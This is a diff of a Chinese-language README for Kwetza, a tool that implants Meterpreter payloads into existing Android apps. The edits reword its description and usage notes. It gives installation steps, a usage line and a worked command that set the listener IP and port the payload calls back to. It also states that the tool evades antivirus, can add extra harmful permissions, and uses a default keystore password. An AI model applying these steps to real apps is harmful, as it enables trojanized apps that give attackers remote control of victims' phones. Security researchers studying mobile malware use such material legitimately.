@@ -1,7 +1,7 @@
 # 介绍
 By Chris Le Roy (@brompwnie) chris@sensepost.com
 
-Kwetza是一种工具，可让您使用Meterpreter有效负载感染现有的Android应用程序。
+Kwetza是一种工具，可让您将Meterpreter payload植入到Android应用程序。
 # 修改说明  
 以下问题均出现在手机Termux终端上<br/>
 1.指定脚本使用python3执行<br/>
@@ -11,7 +11,7 @@ Kwetza是一种工具，可让您使用Meterpreter有效负载感染现有的And
 
 # 它有什么作用？
 
-Kwetza使用自定义或默认有效负载模板感染现有的Android应用程序，以避免被防病毒软件检测。Kwetza允许您使用目标应用程序的默认权限感染Android应用程序，或注入其他权限以获得其他功能。
+Kwetza使用自定义或默认payload模板感染现有的Android应用程序，以避免被杀病毒软件检测出来。Kwetza允许您使用目标应用程序的默认权限感染Android应用程序，或注入其他权限以获得其他功能。
 # 在哪里可以获得博客文章？
 可以在以下位置找到由Kwetza自动化的手动步骤：https://sensepost.com/blog/2016/kwetza-infecting-android-applications/
 
@@ -22,7 +22,7 @@ Kwetza使用自定义或默认有效负载模板感染现有的Android应用程�
 git clone https://github.com/2487686673/Kwetza.git
 ```
 
-Kwetza用Python编写，需要BeautifulSoup，可以使用Pip安装：
+Kwetza用Python编写，需要BeautifulSoup，可以使用pip安装：
 ```
 pip install beautifulsoup4
 ```
@@ -31,12 +31,13 @@ Kwetza要求安装Apktool并可以通过您的PATH访问。可以使用位于此
 
 python kwetza.py nameOfTheApkToInfect.apk https/tcp LHOST LPORT yes/no customClass
 
-* nameOfTheApkToInfect.apk = 你想要感染的APK名称
-* https/tcp = 选择https或tcp连接
-* LHOST = 你的监听IP
-* LPORT = 你的监听端口
-* yes = include "yes" 向应用程序中注入其他有害权限, "no" 使用应用程序的默认权限.
-* customClass = 如果要让Kwetza注入此活动，请在此处指定一个自定义活动
+* nameOfTheApkToInfect.apk = 希望植入payload的apk文件名
+
+* LHOST = 监听IP
+
+* LPORT = 监听端口
+
+* yes/no = 选择yes则会添加额外的权限，选择no则会利用app原来的权限
 
 ```
 python kwetza.py hackme.apk https 10.42.0.118 4444 yes com.moo.another.activity
@@ -77,16 +78,16 @@ jar signed.
 
 
 # 信息
+Kwetza以Python 2开发。
 
-Kwetza已开发为可与Python2配合使用。
+Kwetza默认会使用payload文件夹下的模板和keystore在apk中植入恶意payload。
 
-默认情况下，Kwetza将使用位于“有效载荷”文件夹中的模板和密钥库来注入并签名受感染的apk。
+如果要用自己的证书签署应用，把你的keystore重命名为mykey.keystore放在payload文件夹下。
 
-如果您想使用自己的证书对受感染的应用程序进行签名，请生成一个新的密钥库，并将其放置在“ payload”文件夹中，然后重命名为现有的密钥库，或者在kwetza.py中更改引用。
+你也可以用同样的方法替换默认的payload模板
 
-对于有效负载模板也可以这样做。
+默认keystore的密码是”password”
 
-默认密钥库的密码为“password”。
 # License
 
 Kwetza is licensed under a Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License (http://creativecommons.org/licenses/by-nc-sa/4.0).
